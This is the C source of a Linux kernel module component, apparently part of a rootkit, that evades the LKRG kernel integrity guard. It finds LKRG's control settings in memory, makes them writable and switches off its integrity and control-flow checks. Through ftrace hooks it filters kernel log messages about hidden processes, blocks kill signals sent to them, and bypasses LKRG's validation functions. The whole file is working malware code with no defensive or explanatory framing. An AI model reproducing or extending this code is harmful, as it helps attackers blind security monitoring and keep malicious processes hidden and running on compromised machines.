#include "../include/ub_core.h"
#include "../ftrace/hook_engine.h"
#include "../include/veiled_pids.h"
#include "../include/edr_evade.h"

static atomic_t hooks_active = ATOMIC_INIT(0);
static atomic_t umh_bypass_active = ATOMIC_INIT(0);
static struct notifier_block module_notifier;

#define UB_EDR_SETUP_DELAY_MS 1000

static char ub_edr_log_buf[512];
static DEFINE_SPINLOCK(ub_edr_log_lock);

struct ub_edr_ctrl_conf {
#if defined(CONFIG_X86)
    unsigned int p_smep_validate;
    unsigned int p_smap_validate;
#endif
    unsigned int p_pcfi_validate;
    unsigned int p_pint_validate;
    unsigned int p_kint_validate;
    unsigned int p_log_level;
    unsigned int p_block_modules;
    unsigned int p_msr_validate;
    unsigned int p_heartbeat;
    unsigned int p_interval;
    unsigned int p_umh_validate;
#if defined(CONFIG_X86)
    unsigned int p_smep_enforce;
    unsigned int p_smap_enforce;
#endif
    unsigned int p_pcfi_enforce;
    unsigned int p_pint_enforce;
    unsigned int p_kint_enforce;
    unsigned int p_trigger;
    unsigned int p_hide_lkrg;
    unsigned int p_umh_enforce;
    unsigned int p_profile_validate;
    unsigned int p_profile_enforce;
};

struct ub_edr_ro_view {
#if !defined(CONFIG_ARM) && defined(CONFIG_X86)
    unsigned long marker_np1 __attribute__((aligned(PAGE_SIZE)));
#endif
    struct {
        struct ub_edr_ctrl_conf ctrl;
    } p_lkrg_global_ctrl __attribute__((aligned(PAGE_SIZE)));
};

static struct ub_edr_ctrl_conf saved_lkrg_ctrl;
static struct ub_edr_ctrl_conf *ub_edr_ctrl;
static bool ub_edr_ctrl_saved;
static int (*set_memory_rw_fn)(unsigned long addr, int numpages);
static int (*set_memory_ro_fn)(unsigned long addr, int numpages);
static void ub_edr_setup_workfn(struct work_struct *work);
static DECLARE_DELAYED_WORK(ub_edr_setup_work, ub_edr_setup_workfn);

static notrace bool ctrl_ok(struct ub_edr_ctrl_conf *ctrl)
{
    if (!ctrl)
        return false;

    if (ctrl->p_pcfi_validate > 9 || ctrl->p_pint_validate > 9 ||
        ctrl->p_kint_validate > 9 || ctrl->p_umh_validate > 9 ||
        ctrl->p_pcfi_enforce > 9 || ctrl->p_pint_enforce > 9 ||
        ctrl->p_kint_enforce > 9 || ctrl->p_umh_enforce > 9 ||
        ctrl->p_profile_validate > 9 || ctrl->p_profile_enforce > 9 ||
        ctrl->p_log_level > 9)
        return false;

    return true;
}

static notrace struct ub_edr_ctrl_conf *ub_edr_scan_module_memory(void)
{
    unsigned long addr;
    struct ub_edr_ctrl_conf buf;
    struct ub_edr_ctrl_conf *found = NULL;
    int candidates = 0;

    for (addr = MODULES_VADDR; addr + sizeof(buf) <= MODULES_END; addr += PAGE_SIZE) {
        if (copy_from_kernel_nofault(&buf, (void *)addr, sizeof(buf)) != 0)
            continue;

        if (!ctrl_ok(&buf))
            continue;

        if (buf.p_hide_lkrg != 1)
            continue;

        if (!buf.p_umh_validate && !buf.p_pint_validate && !buf.p_pcfi_validate)
            continue;

        if (buf.p_interval < 5 || buf.p_interval > 1800)
            continue;

        if (buf.p_log_level > 4)
            continue;

        candidates++;
        found = (struct ub_edr_ctrl_conf *)addr;

        if (candidates > 1)
            return NULL;
    }

    return found;
}

static notrace struct ub_edr_ctrl_conf *ub_edr_find_ctrl(void)
{
    void *ro;
    struct ub_edr_ctrl_conf *ctrl;

    if (ub_edr_ctrl)
        return ub_edr_ctrl;

    ro = ub_resolve_symbol("p_ro");
    if (ro) {
        ctrl = &((struct ub_edr_ro_view *)ro)->p_lkrg_global_ctrl.ctrl;
        if (ctrl_ok(ctrl))
            return ctrl;

        ctrl = (struct ub_edr_ctrl_conf *)ro;
        if (ctrl_ok(ctrl))
            return ctrl;
    }

    return ub_edr_scan_module_memory();
}

static notrace bool ub_edr_ctrl_make_rw(void *addr)
{
    unsigned long page = (unsigned long)addr & PAGE_MASK;

    if (!set_memory_rw_fn)
        set_memory_rw_fn = (void *)ub_resolve_symbol("set_memory_rw");
    if (!set_memory_rw_fn)
        return false;

    return set_memory_rw_fn(page, 1) == 0;
}

static notrace void ub_edr_ctrl_make_ro(void *addr)
{
    unsigned long page = (unsigned long)addr & PAGE_MASK;

    if (!set_memory_ro_fn)
        set_memory_ro_fn = (void *)ub_resolve_symbol("set_memory_ro");
    if (set_memory_ro_fn)
        set_memory_ro_fn(page, 1);
}

static notrace bool ub_edr_relax_controls(void)
{
    struct ub_edr_ctrl_conf *ctrl;

    ctrl = ub_edr_find_ctrl();
    if (!ctrl)
        return false;

    ub_edr_ctrl = ctrl;

    if (!ctrl->p_pint_validate && !ctrl->p_pint_enforce &&
        !ctrl->p_pcfi_validate && !ctrl->p_pcfi_enforce &&
        !ctrl->p_umh_validate && !ctrl->p_umh_enforce)
        return true;

    if (!ub_edr_ctrl_saved) {
        memcpy(&saved_lkrg_ctrl, ctrl, sizeof(saved_lkrg_ctrl));
        ub_edr_ctrl_saved = true;
    }

    if (!ub_edr_ctrl_make_rw(ctrl))
        return false;

    WRITE_ONCE(ctrl->p_pint_validate, 0);
    WRITE_ONCE(ctrl->p_pint_enforce, 0);
    WRITE_ONCE(ctrl->p_pcfi_validate, 0);
    WRITE_ONCE(ctrl->p_pcfi_enforce, 0);
    WRITE_ONCE(ctrl->p_umh_validate, 0);
    WRITE_ONCE(ctrl->p_umh_enforce, 0);
    ub_edr_ctrl_make_ro(ctrl);

    return true;
}

static notrace void ub_edr_restore_controls(void)
{
    if (!ub_edr_ctrl || !ub_edr_ctrl_saved)
        return;

    ub_edr_ctrl_make_rw(ub_edr_ctrl);
    WRITE_ONCE(ub_edr_ctrl->p_pint_validate, saved_lkrg_ctrl.p_pint_validate);
    WRITE_ONCE(ub_edr_ctrl->p_pint_enforce, saved_lkrg_ctrl.p_pint_enforce);
    WRITE_ONCE(ub_edr_ctrl->p_pcfi_validate, saved_lkrg_ctrl.p_pcfi_validate);
    WRITE_ONCE(ub_edr_ctrl->p_pcfi_enforce, saved_lkrg_ctrl.p_pcfi_enforce);
    WRITE_ONCE(ub_edr_ctrl->p_umh_validate, saved_lkrg_ctrl.p_umh_validate);
    WRITE_ONCE(ub_edr_ctrl->p_umh_enforce, saved_lkrg_ctrl.p_umh_enforce);
    ub_edr_ctrl_make_ro(ub_edr_ctrl);
}

static notrace bool ptree_hidden(struct task_struct *task)
{
    int depth = 0;
    struct task_struct *parent;
    bool found = false;

    if (!task) task = current;
    if (!task) return false;

    rcu_read_lock();
    while (task && depth < 64) {
        if (ub_is_veiled(task->pid) || ub_is_veiled(task->tgid) ||
            ub_is_offspring(task->pid) || ub_is_offspring(task->tgid)) {
            found = true;
            break;
        }

        parent = rcu_dereference(task->real_parent);
        if (!parent || parent == task || task->pid <= 1)
            break;
        task = parent;
        depth++;
    }
    rcu_read_unlock();
    return found;
}

static notrace bool should_hide_task(struct task_struct *task)
{
    return task ? ptree_hidden(task) : false;
}

static notrace bool should_skip_lkrg_ed(void)
{
    ub_edr_relax_controls();

    if (atomic_read(&umh_bypass_active) > 0)
        return true;

    return should_hide_task(current);
}

static notrace pid_t extract_pid_from_log(const char *msg)
{
    const char *p;
    pid_t pid = 0;
    
    if (!msg) return 0;
    
    p = strstr(msg, "pid ");
    if (!p) p = strstr(msg, "Killing pid ");
    if (!p) return 0;
    
    while (*p && (*p < '0' || *p > '9')) p++;
    while (*p >= '0' && *p <= '9') {
        pid = pid * 10 + (*p - '0');
        p++;
    }
    return pid;
}

static notrace bool should_filter_log(const char *msg)
{
    pid_t pid;

    if (!msg || !strstr(msg, "LKRG")) return false;
    
    if (atomic_read(&umh_bypass_active) > 0) {
        if (strstr(msg, "UMH") || strstr(msg, "BLOCK") ||
            strstr(msg, "usermodehelper") || strstr(msg, "Blocked"))
            return true;
    }
    
    pid = extract_pid_from_log(msg);
    if (pid > 0 && (ub_is_veiled(pid) || ub_is_offspring(pid)))
        return true;

    return false;
}

static asmlinkage int (*ub_real_vprintk_emit)(int facility, int level,
    const struct dev_printk_info *dev_info, const char *fmt, va_list args) = NULL;

static notrace asmlinkage int ub_hook_vprintk_emit(int facility, int level,
    const struct dev_printk_info *dev_info, const char *fmt, va_list args)
{
    unsigned long flags;
    va_list args_copy;
    bool filter = false;
    int len = 0;
    
    if (!ub_real_vprintk_emit || !fmt) 
        return ub_real_vprintk_emit ? ub_real_vprintk_emit(facility, level, dev_info, fmt, args) : 0;
    
    if (!strstr(fmt, "LKRG") && !strstr(fmt, "lkrg") && !strstr(fmt, "p_lkrg"))
        return ub_real_vprintk_emit(facility, level, dev_info, fmt, args);
    
    spin_lock_irqsave(&ub_edr_log_lock, flags);
    va_copy(args_copy, args);
    len = vsnprintf(ub_edr_log_buf, sizeof(ub_edr_log_buf) - 1, fmt, args_copy);
    va_end(args_copy);
    ub_edr_log_buf[sizeof(ub_edr_log_buf) - 1] = '\0';
    filter = should_filter_log(ub_edr_log_buf);
    spin_unlock_irqrestore(&ub_edr_log_lock, flags);
    
    if (filter) return len;
    return ub_real_vprintk_emit(facility, level, dev_info, fmt, args);
}

static int (*ub_real_send_sig_info)(int sig, struct kernel_siginfo *info,
    struct task_struct *p) = NULL;

static notrace int ub_hook_send_sig_info(int sig, struct kernel_siginfo *info,
    struct task_struct *p)
{
    if (sig == SIGKILL && p) {
        if (ub_is_veiled(p->tgid) || ub_is_offspring(p->tgid) ||
            ub_is_veiled(p->pid)  || ub_is_offspring(p->pid))
            return 0;
    }
    return ub_real_send_sig_info ? ub_real_send_sig_info(sig, info, p) : 0;
}

static int (*ub_real_call_usermodehelper_exec_async)(void *data) = NULL;

static notrace int ub_hook_call_usermodehelper_exec_async(void *data)
{
    bool bypass_active = atomic_read(&umh_bypass_active) > 0;

    ub_edr_relax_controls();
    
    if (bypass_active) {
        ub_veil_pid(current->pid);
        ub_offspring_track(current->pid);
    }
    
    return ub_real_call_usermodehelper_exec_async ?
        ub_real_call_usermodehelper_exec_async(data) : 0;
}

static int (*ub_real_call_usermodehelper_exec)(struct subprocess_info *sub_info, int wait) = NULL;

static notrace int ub_hook_call_usermodehelper_exec(struct subprocess_info *sub_info, int wait)
{
    int ret;
    bool bypass_active = atomic_read(&umh_bypass_active) > 0;

    ub_edr_relax_controls();
    
    if (bypass_active) {
        ub_veil_pid(current->pid);
    }
    
    ret = ub_real_call_usermodehelper_exec ? 
        ub_real_call_usermodehelper_exec(sub_info, wait) : -ENOENT;
    
    return ret;
}

static void (*ub_real_p_ed_enforce_validation)(void) = NULL;

static notrace void ub_hook_p_ed_enforce_validation(void)
{
    if (should_skip_lkrg_ed())
        return;

    if (ub_real_p_ed_enforce_validation)
        ub_real_p_ed_enforce_validation();
}

static unsigned int (*ub_real_p_ed_enforce_validation_paranoid)(void) = NULL;

static notrace unsigned int ub_hook_p_ed_enforce_validation_paranoid(void)
{
    if (atomic_read(&umh_bypass_active) > 0 || ub_veiled_pid_count() > 0 || ub_offspring_pid_count() > 0)
        return 0;

    return ub_real_p_ed_enforce_validation_paranoid ?
        ub_real_p_ed_enforce_validation_paranoid() : 0;
}

static void (*ub_real_p_ed_validate_current)(void *p_source) = NULL;

static notrace void ub_hook_p_ed_validate_current(void *p_source)
{
    if (should_skip_lkrg_ed())
        return;

    if (ub_real_p_ed_validate_current)
        ub_real_p_ed_validate_current(p_source);
}

static void (*ub_real_p_ed_validate_off_flag_wrap)(void *p_source) = NULL;

static notrace void ub_hook_p_ed_validate_off_flag_wrap(void *p_source)
{
    if (should_skip_lkrg_ed())
        return;

    if (ub_real_p_ed_validate_off_flag_wrap)
        ub_real_p_ed_validate_off_flag_wrap(p_source);
}

static int (*ub_real_p_ed_enforce_pcfi)(struct task_struct *task, void *orig,
    struct pt_regs *regs) = NULL;

static notrace int ub_hook_p_ed_enforce_pcfi(struct task_struct *task, void *orig,
    struct pt_regs *regs)
{
    if (atomic_read(&umh_bypass_active) > 0 || should_hide_task(task ? task : current))
        return 0;

    return ub_real_p_ed_enforce_pcfi ?
        ub_real_p_ed_enforce_pcfi(task, orig, regs) : 0;
}

static struct ftrace_hook ub_edr_hooks[] = {
    HOOK("vprintk_emit",                          ub_hook_vprintk_emit,                      &ub_real_vprintk_emit),
    HOOK("call_usermodehelper_exec_async",         ub_hook_call_usermodehelper_exec_async,    &ub_real_call_usermodehelper_exec_async),
    HOOK("call_usermodehelper_exec",               ub_hook_call_usermodehelper_exec,          &ub_real_call_usermodehelper_exec),
    HOOK("send_sig_info",                          ub_hook_send_sig_info,                     &ub_real_send_sig_info),
    HOOK("p_ed_enforce_validation",                ub_hook_p_ed_enforce_validation,           &ub_real_p_ed_enforce_validation),
    HOOK("p_ed_enforce_validation_paranoid",       ub_hook_p_ed_enforce_validation_paranoid,  &ub_real_p_ed_enforce_validation_paranoid),
    HOOK("p_ed_validate_current",                  ub_hook_p_ed_validate_current,             &ub_real_p_ed_validate_current),
    HOOK("p_ed_validate_off_flag_wrap",            ub_hook_p_ed_validate_off_flag_wrap,       &ub_real_p_ed_validate_off_flag_wrap),
    HOOK("p_ed_enforce_pcfi",                      ub_hook_p_ed_enforce_pcfi,                 &ub_real_p_ed_enforce_pcfi),
};

static notrace int try_install_hooks(void)
{
    int i, installed = 0;
    
    for (i = 0; i < ARRAY_SIZE(ub_edr_hooks); i++) {
        if (ub_edr_hooks[i].address)
            continue;
        if (ub_fh_install_hook(&ub_edr_hooks[i]) == 0)
            installed++;
    }
    
    if (installed > 0) {
        atomic_set(&hooks_active, 1);
        return 0;
    }
    return -ENOENT;
}

static notrace void remove_hooks(void)
{
    int i;
    for (i = ARRAY_SIZE(ub_edr_hooks) - 1; i >= 0; i--) {
        if (ub_edr_hooks[i].address)
            ub_fh_remove_hook(&ub_edr_hooks[i]);
    }
    atomic_set(&hooks_active, 0);
}

static void ub_edr_setup_workfn(struct work_struct *work)
{
    ub_edr_relax_controls();
    try_install_hooks();
    ub_edr_relax_controls();
}

static notrace int module_notify(struct notifier_block *nb, unsigned long action, void *data)
{
    struct module *mod = data;
    
    if (!mod) return NOTIFY_DONE;

    if (action == MODULE_STATE_LIVE && strstr(mod->name, "lkrg"))
        schedule_delayed_work(&ub_edr_setup_work, msecs_to_jiffies(UB_EDR_SETUP_DELAY_MS));

    return NOTIFY_DONE;
}

notrace void ub_umh_bypass_on(void)
{
    atomic_inc(&umh_bypass_active);
}
EXPORT_SYMBOL(ub_umh_bypass_on);

notrace void ub_umh_bypass_off(void)
{
    if (atomic_read(&umh_bypass_active) > 0)
        atomic_dec(&umh_bypass_active);
}
EXPORT_SYMBOL(ub_umh_bypass_off);

notrace bool ub_edr_engaged(void)
{
    return atomic_read(&hooks_active) > 0;
}

notrace int ub_edr_evade_start(void)
{
    module_notifier.notifier_call = module_notify;
    register_module_notifier(&module_notifier);

    try_install_hooks();
    ub_edr_relax_controls();

    return 0;
}

notrace void ub_edr_evade_stop(void)
{
    cancel_delayed_work_sync(&ub_edr_setup_work);
    unregister_module_notifier(&module_notifier);
    remove_hooks();
    ub_edr_restore_controls();
    atomic_set(&umh_bypass_active, 0);
}
